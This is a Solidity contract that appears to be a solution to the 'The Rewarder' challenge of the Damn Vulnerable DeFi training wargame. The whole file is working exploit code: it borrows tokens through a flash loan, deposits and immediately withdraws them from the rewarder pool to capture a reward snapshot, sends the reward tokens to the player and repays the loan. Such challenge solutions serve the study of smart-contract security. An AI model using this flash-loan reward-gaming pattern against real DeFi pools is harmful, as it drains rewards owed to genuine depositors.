// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttack {

    FlashLoanerPool public flashLoanPool;
    TheRewarderPool public rewarderPool;
    RewardToken public rewardToken;
    DamnValuableToken public dvt;
    address public player;

    constructor(FlashLoanerPool _flashLoanPool, TheRewarderPool _rewarderPool, RewardToken _rewardToken, DamnValuableToken _dvt) {
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;
        rewardToken = _rewardToken;
        dvt = _dvt;
        player = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) public {
        dvt.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
        dvt.transfer(address(flashLoanPool), amount);
    }

    function attack(uint256 amount) public {
        flashLoanPool.flashLoan(amount);
    }
}
